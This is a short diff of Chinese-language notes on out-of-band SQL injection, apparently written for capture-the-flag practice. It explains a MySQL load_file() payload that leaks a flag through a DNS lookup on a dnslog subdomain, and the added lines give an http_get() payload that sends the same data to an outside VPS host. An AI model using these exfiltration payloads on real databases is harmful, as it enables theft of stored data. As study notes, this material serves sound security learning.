@@ -14,3 +14,7 @@ select load_file(concat('\\\\',(select flag from `191981093114514`),'.xxx.dnslog
 需要权限和dns53端口开启,'\\\\'sql转义为\\,\a转义为\a,拼接结果为\\flag{xxx}.xxx.dnslog.cn\a
 利用 Windows UNC共享路径\\主机名\资源的特性:MySQL 调用load_file()读取该路径时,会先对主机名发起DNS解析请求
 把查询数据拼在子域名,DNS日志平台记录解析请求,拿到数据。(linux不稳定一般不用dns注入)
+
+HTTP注入:
+select http_get(concat('http://xxx.vps.com/?data=',(select flag from `191981093114514`)));
+需高权限和80/443端口开启以及允许创建自定义函数
